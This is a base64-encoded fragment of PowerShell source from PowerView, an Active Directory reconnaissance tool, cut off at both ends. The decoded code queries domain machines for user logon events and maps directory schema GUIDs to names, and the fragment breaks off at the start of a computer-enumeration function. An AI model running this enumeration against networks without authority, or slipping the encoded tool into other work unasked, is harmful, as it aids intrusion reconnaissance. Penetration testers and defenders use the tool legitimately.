SdyZSBwYXNzaW5nIHRvIEdldC1XaW5FdmVudAogICAgICAgICRYUGF0aEZpbHRlciA9IEAiCjxRdWVyeUxpc3Q+CiAgICA8UXVlcnkgSWQ9IjAiIFBhdGg9IlNlY3VyaXR5Ij4KCiAgICAgICAgPCEtLSBMb2dvbiBldmVudHMgLS0+CiAgICAgICAgPFNlbGVjdCBQYXRoPSJTZWN1cml0eSI+CiAgICAgICAgICAgICpbCiAgICAgICAgICAgICAgICBTeXN0ZW1bCiAgICAgICAgICAgICAgICAgICAgUHJvdmlkZXJbCiAgICAgICAgICAgICAgICAgICAgICAgIEBOYW1lPSdNaWNyb3NvZnQtV2luZG93cy1TZWN1cml0eS1BdWRpdGluZycKICAgICAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgICAgICAgICAgYW5kIChMZXZlbD00IG9yIExldmVsPTApIGFuZCAoRXZlbnRJRD00NjI0KQogICAgICAgICAgICAgICAgICAgIGFuZCBUaW1lQ3JlYXRlZFsKICAgICAgICAgICAgICAgICAgICAgICAgQFN5c3RlbVRpbWUmZ3Q7PSckKCRTdGFydFRpbWUuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ3MnKSknIGFuZCBAU3lzdGVtVGltZSZsdDs9JyQoJEVuZFRpbWUuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ3MnKSknCiAgICAgICAgICAgICAgICAgICAgXQogICAgICAgICAgICAgICAgXQogICAgICAgICAgICBdCiAgICAgICAgICAgIGFuZAogICAgICAgICAgICAqW0V2ZW50RGF0YVtEYXRhW0BOYW1lPSdUYXJnZXRVc2VyTmFtZSddICE9ICdBTk9OWU1PVVMgTE9HT04nXV0KICAgICAgICA8L1NlbGVjdD4KCiAgICAgICAgPCEtLSBMb2dvbiB3aXRoIGV4cGxpY2l0IGNyZWRlbnRpYWwgZXZlbnRzIC0tPgogICAgICAgIDxTZWxlY3QgUGF0aD0iU2VjdXJpdHkiPgogICAgICAgICAgICAqWwogICAgICAgICAgICAgICAgU3lzdGVtWwogICAgICAgICAgICAgICAgICAgIFByb3ZpZGVyWwogICAgICAgICAgICAgICAgICAgICAgICBATmFtZT0nTWljcm9zb2Z0LVdpbmRvd3MtU2VjdXJpdHktQXVkaXRpbmcnCiAgICAgICAgICAgICAgICAgICAgXQogICAgICAgICAgICAgICAgICAgIGFuZCAoTGV2ZWw9NCBvciBMZXZlbD0wKSBhbmQgKEV2ZW50SUQ9NDY0OCkKICAgICAgICAgICAgICAgICAgICBhbmQgVGltZUNyZWF0ZWRbCiAgICAgICAgICAgICAgICAgICAgICAgIEBTeXN0ZW1UaW1lJmd0Oz0nJCgkU3RhcnRUaW1lLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdzJykpJyBhbmQgQFN5c3RlbVRpbWUmbHQ7PSckKCRFbmRUaW1lLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdzJykpJwogICAgICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgXQogICAgICAgIDwvU2VsZWN0PgoKICAgICAgICA8U3VwcHJlc3MgUGF0aD0iU2VjdXJpdHkiPgogICAgICAgICAgICAqWwogICAgICAgICAgICAgICAgU3lzdGVtWwogICAgICAgICAgICAgICAgICAgIFByb3ZpZGVyWwogICAgICAgICAgICAgICAgICAgICAgICBATmFtZT0nTWljcm9zb2Z0LVdpbmRvd3MtU2VjdXJpdHktQXVkaXRpbmcnCiAgICAgICAgICAgICAgICAgICAgXQogICAgICAgICAgICAgICAgICAgIGFuZAogICAgICAgICAgICAgICAgICAgIChMZXZlbD00IG9yIExldmVsPTApIGFuZCAoRXZlbnRJRD00NjI0IG9yIEV2ZW50SUQ9NDYyNSBvciBFdmVudElEPTQ2MzQpCiAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgIF0KICAgICAgICAgICAgYW5kCiAgICAgICAgICAgICpbCiAgICAgICAgICAgICAgICBFdmVudERhdGFbCiAgICAgICAgICAgICAgICAgICAgKAogICAgICAgICAgICAgICAgICAgICAgICAoRGF0YVtATmFtZT0nTG9nb25UeXBlJ109JzUnIG9yIERhdGFbQE5hbWU9J0xvZ29uVHlwZSddPScwJykKICAgICAgICAgICAgICAgICAgICAgICAgb3IKICAgICAgICAgICAgICAgICAgICAgICAgRGF0YVtATmFtZT0nVGFyZ2V0VXNlck5hbWUnXT0nQU5PTllNT1VTIExPR09OJwogICAgICAgICAgICAgICAgICAgICAgICBvcgogICAgICAgICAgICAgICAgICAgICAgICBEYXRhW0BOYW1lPSdUYXJnZXRVc2VyU0lEJ109J1MtMS01LTE4JwogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgXQogICAgICAgIDwvU3VwcHJlc3M+CiAgICA8L1F1ZXJ5Pgo8L1F1ZXJ5TGlzdD4KIkAKICAgICAgICAkRXZlbnRBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnRmlsdGVyWFBhdGgnID0gJFhQYXRoRmlsdGVyCiAgICAgICAgICAgICdMb2dOYW1lJyA9ICdTZWN1cml0eScKICAgICAgICAgICAgJ01heEV2ZW50cycgPSAkTWF4RXZlbnRzCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkRXZlbnRBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewoKICAgICAgICAgICAgJEV2ZW50QXJndW1lbnRzWydDb21wdXRlck5hbWUnXSA9ICRDb21wdXRlcgoKICAgICAgICAgICAgR2V0LVdpbkV2ZW50IEBFdmVudEFyZ3VtZW50c3wgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJEV2ZW50ID0gJF8KICAgICAgICAgICAgICAgICRQcm9wZXJ0aWVzID0gJEV2ZW50LlByb3BlcnRpZXMKICAgICAgICAgICAgICAgIFN3aXRjaCAoJEV2ZW50LklkKSB7CiAgICAgICAgICAgICAgICAgICAgIyBsb2dvbiBldmVudAogICAgICAgICAgICAgICAgICAgIDQ2MjQgewogICAgICAgICAgICAgICAgICAgICAgICAjIHNraXAgY29tcHV0ZXIgbG9nb25zLCBmb3Igbm93Li4uCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKC1ub3QgJFByb3BlcnRpZXNbNV0uVmFsdWUuRW5kc1dpdGgoJyQnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCA9IE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5IEB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJOYW1lICAgICAgICAgICAgICA9ICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRpbWVDcmVhdGVkICAgICAgICAgICAgICAgPSAkRXZlbnQuVGltZUNyZWF0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFdmVudElkICAgICAgICAgICAgICAgICAgID0gJEV2ZW50LklkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU3ViamVjdFVzZXJTaWQgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzBdLlZhbHVlLlRvU3RyaW5nKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJqZWN0VXNlck5hbWUgICAgICAgICAgID0gJFByb3BlcnRpZXNbMV0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJqZWN0RG9tYWluTmFtZSAgICAgICAgID0gJFByb3BlcnRpZXNbMl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJqZWN0TG9nb25JZCAgICAgICAgICAgID0gJFByb3BlcnRpZXNbM10uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUYXJnZXRVc2VyU2lkICAgICAgICAgICAgID0gJFByb3BlcnRpZXNbNF0uVmFsdWUuVG9TdHJpbmcoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldFVzZXJOYW1lICAgICAgICAgICAgPSAkUHJvcGVydGllc1s1XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldERvbWFpbk5hbWUgICAgICAgICAgPSAkUHJvcGVydGllc1s2XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldExvZ29uSWQgICAgICAgICAgICAgPSAkUHJvcGVydGllc1s3XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvZ29uVHlwZSAgICAgICAgICAgICAgICAgPSAkUHJvcGVydGllc1s4XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvZ29uUHJvY2Vzc05hbWUgICAgICAgICAgPSAkUHJvcGVydGllc1s5XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEF1dGhlbnRpY2F0aW9uUGFja2FnZU5hbWUgPSAkUHJvcGVydGllc1sxMF0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXb3Jrc3RhdGlvbk5hbWUgICAgICAgICAgID0gJFByb3BlcnRpZXNbMTFdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9nb25HdWlkICAgICAgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzEyXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYW5zbWl0dGVkU2VydmljZXMgICAgICAgPSAkUHJvcGVydGllc1sxM10uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMbVBhY2thZ2VOYW1lICAgICAgICAgICAgID0gJFByb3BlcnRpZXNbMTRdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgS2V5TGVuZ3RoICAgICAgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzE1XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByb2Nlc3NJZCAgICAgICAgICAgICAgICAgPSAkUHJvcGVydGllc1sxNl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNzTmFtZSAgICAgICAgICAgICAgID0gJFByb3BlcnRpZXNbMTddLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSXBBZGRyZXNzICAgICAgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzE4XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElwUG9ydCAgICAgICAgICAgICAgICAgICAgPSAkUHJvcGVydGllc1sxOV0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJbXBlcnNvbmF0aW9uTGV2ZWwgICAgICAgID0gJFByb3BlcnRpZXNbMjBdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzdHJpY3RlZEFkbWluTW9kZSAgICAgICA9ICRQcm9wZXJ0aWVzWzIxXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldE91dGJvdW5kVXNlck5hbWUgICAgPSAkUHJvcGVydGllc1syMl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUYXJnZXRPdXRib3VuZERvbWFpbk5hbWUgID0gJFByb3BlcnRpZXNbMjNdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmlydHVhbEFjY291bnQgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzI0XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldExpbmtlZExvZ29uSWQgICAgICAgPSAkUHJvcGVydGllc1syNV0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbGV2YXRlZFRva2VuICAgICAgICAgICAgID0gJFByb3BlcnRpZXNbMjZdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Mb2dvbkV2ZW50JykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgIyBsb2dvbiB3aXRoIGV4cGxpY2l0IGNyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICA0NjQ4IHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBza2lwIGNvbXB1dGVyIGxvZ29ucywgZm9yIG5vdy4uLgogICAgICAgICAgICAgICAgICAgICAgICBpZigoLW5vdCAkUHJvcGVydGllc1s1XS5WYWx1ZS5FbmRzV2l0aCgnJCcpKSAtYW5kICgkUHJvcGVydGllc1sxMV0uVmFsdWUgLW1hdGNoICd0YXNraG9zdFwuZXhlJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgPSBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSBAewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbXB1dGVyTmFtZSAgICAgICAgICAgICAgPSAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUaW1lQ3JlYXRlZCAgICAgICA9ICRFdmVudC5UaW1lQ3JlYXRlZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEV2ZW50SWQgICAgICAgICAgID0gJEV2ZW50LklkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU3ViamVjdFVzZXJTaWQgICAgPSAkUHJvcGVydGllc1swXS5WYWx1ZS5Ub1N0cmluZygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU3ViamVjdFVzZXJOYW1lICAgPSAkUHJvcGVydGllc1sxXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN1YmplY3REb21haW5OYW1lID0gJFByb3BlcnRpZXNbMl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJqZWN0TG9nb25JZCAgICA9ICRQcm9wZXJ0aWVzWzNdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9nb25HdWlkICAgICAgICAgPSAkUHJvcGVydGllc1s0XS5WYWx1ZS5Ub1N0cmluZygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGFyZ2V0VXNlck5hbWUgICAgPSAkUHJvcGVydGllc1s1XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldERvbWFpbk5hbWUgID0gJFByb3BlcnRpZXNbNl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUYXJnZXRMb2dvbkd1aWQgICA9ICRQcm9wZXJ0aWVzWzddLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGFyZ2V0U2VydmVyTmFtZSAgPSAkUHJvcGVydGllc1s4XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldEluZm8gICAgICAgID0gJFByb3BlcnRpZXNbOV0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNzSWQgICAgICAgICA9ICRQcm9wZXJ0aWVzWzEwXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByb2Nlc3NOYW1lICAgICAgID0gJFByb3BlcnRpZXNbMTFdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSXBBZGRyZXNzICAgICAgICAgPSAkUHJvcGVydGllc1sxMl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJcFBvcnQgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzEzXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRXhwbGljaXRDcmVkZW50aWFsTG9nb25FdmVudCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIk5vIGhhbmRsZXIgZXhpc3RzIGZvciBldmVudCBJRDogJCgkRXZlbnQuSWQpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5HVUlETWFwIHsKPCMKLlNZTk9QU0lTCgpIZWxwZXIgdG8gYnVpbGQgYSBoYXNoIHRhYmxlIG9mIFtHVUlEXSAtPiByZXNvbHZlZCBuYW1lcyBmb3IgdGhlIGN1cnJlbnQgb3Igc3BlY2lmaWVkIERvbWFpbi4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpblNlYXJjaGVyLCBHZXQtRm9yZXN0ICAKCi5ERVNDUklQVElPTgoKU2VhcmNoZXMgdGhlIGZvcmVzdCBzY2hlbWEgbG9jYXRpb24gKENOPVNjaGVtYSxDTj1Db25maWd1cmF0aW9uLERDPXRlc3RsYWIsREM9bG9jYWwpIGZvcgphbGwgb2JqZWN0cyB3aXRoIHNjaGVtYUlER1VJRCBzZXQgYW5kIHRyYW5zbGF0ZXMgdGhlIEdVSURzIGRpc2NvdmVyZWQgdG8gaHVtYW4tcmVhZGFibGUgbmFtZXMuClRoZW4gc2VhcmNoZXMgdGhlIGV4dGVuZGVkIHJpZ2h0cyBsb2NhdGlvbiAoQ049RXh0ZW5kZWQtUmlnaHRzLENOPUNvbmZpZ3VyYXRpb24sREM9dGVzdGxhYixEQz1sb2NhbCkKZm9yIG9iamVjdHMgd2hlcmUgb2JqZWN0Q2xhc3M9Y29udHJvbEFjY2Vzc1JpZ2h0LCB0cmFuc2xhdGluZyB0aGUgR1VJRHMgYWdhaW4uCgpIZWF2aWx5IGFkYXB0ZWQgZnJvbSBodHRwOi8vYmxvZ3MudGVjaG5ldC5jb20vYi9hc2hsZXltY2dsb25lL2FyY2hpdmUvMjAxMy8wMy8yNS9hY3RpdmUtZGlyZWN0b3J5LW91LXBlcm1pc3Npb25zLXJlcG9ydC1mcmVlLXBvd2Vyc2hlbGwtc2NyaXB0LWRvd25sb2FkLmFzcHgKCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouT1VUUFVUUwoKSGFzaHRhYmxlCgpPdXB1dHMgYSBoYXNodGFibGUgY29udGFpbmluZyBhIEdVSUQgLT4gUmVhZGFibGUgTmFtZSBtYXBwaW5nLgoKLkxJTksKCmh0dHA6Ly9ibG9ncy50ZWNobmV0LmNvbS9iL2FzaGxleW1jZ2xvbmUvYXJjaGl2ZS8yMDEzLzAzLzI1L2FjdGl2ZS1kaXJlY3Rvcnktb3UtcGVybWlzc2lvbnMtcmVwb3J0LWZyZWUtcG93ZXJzaGVsbC1zY3JpcHQtZG93bmxvYWQuYXNweAojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbSGFzaHRhYmxlXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICAkR1VJRHMgPSBAeycwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAnID0gJ0FsbCd9CgogICAgJEZvcmVzdEFyZ3VtZW50cyA9IEB7fQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRGb3Jlc3RBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICB0cnkgewogICAgICAgICRTY2hlbWFQYXRoID0gKEdldC1Gb3Jlc3QgQEZvcmVzdEFyZ3VtZW50cykuc2NoZW1hLm5hbWUKICAgIH0KICAgIGNhdGNoIHsKICAgICAgICB0aHJvdyAnW0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiByZXRyaWV2aW5nIGZvcmVzdCBzY2hlbWEgcGF0aCBmcm9tIEdldC1Gb3Jlc3QnCiAgICB9CiAgICBpZiAoLW5vdCAkU2NoZW1hUGF0aCkgewogICAgICAgIHRocm93ICdbR2V0LURvbWFpbkdVSURNYXBdIEVycm9yIGluIHJldHJpZXZpbmcgZm9yZXN0IHNjaGVtYSBwYXRoIGZyb20gR2V0LUZvcmVzdCcKICAgIH0KCiAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICdTZWFyY2hCYXNlJyA9ICRTY2hlbWFQYXRoCiAgICAgICAgJ0xEQVBGaWx0ZXInID0gJyhzY2hlbWFJREdVSUQ9KiknCiAgICB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAkU2NoZW1hU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCgogICAgaWYgKCRTY2hlbWFTZWFyY2hlcikgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgICRSZXN1bHRzID0gJFNjaGVtYVNlYXJjaGVyLkZpbmRBbGwoKQogICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJEdVSURzWyhOZXctT2JqZWN0IEd1aWQgKCwkXy5wcm9wZXJ0aWVzLnNjaGVtYWlkZ3VpZFswXSkpLkd1aWRdID0gJF8ucHJvcGVydGllcy5uYW1lWzBdCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFNjaGVtYVNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgaW4gYnVpbGRpbmcgR1VJRCBtYXA6ICRfIgogICAgICAgIH0KICAgIH0KCiAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTY2hlbWFQYXRoLnJlcGxhY2UoJ1NjaGVtYScsJ0V4dGVuZGVkLVJpZ2h0cycpCiAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICcob2JqZWN0Q2xhc3M9Y29udHJvbEFjY2Vzc1JpZ2h0KScKICAgICRSaWdodHNTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKCiAgICBpZiAoJFJpZ2h0c1NlYXJjaGVyKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJFJlc3VsdHMgPSAkUmlnaHRzU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkR1VJRHNbJF8ucHJvcGVydGllcy5yaWdodHNndWlkWzBdLnRvU3RyaW5nKCldID0gJF8ucHJvcGVydGllcy5uYW1lWzBdCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFJpZ2h0c1NlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgaW4gYnVpbGRpbmcgR1VJRCBtYXA6ICRfIgogICAgICAgIH0KICAgIH0KCiAgICAkR1VJRHMKfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5Db21wdXRlciB7CjwjCi5TWU5PUFNJUwoKUmV0dXJuIGFsbCBjb21wdXRlcnMgb3Igc3BlY2lmaWMgY29tcHV0ZXIgb2JqZWN0cyBpbiBBRC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXV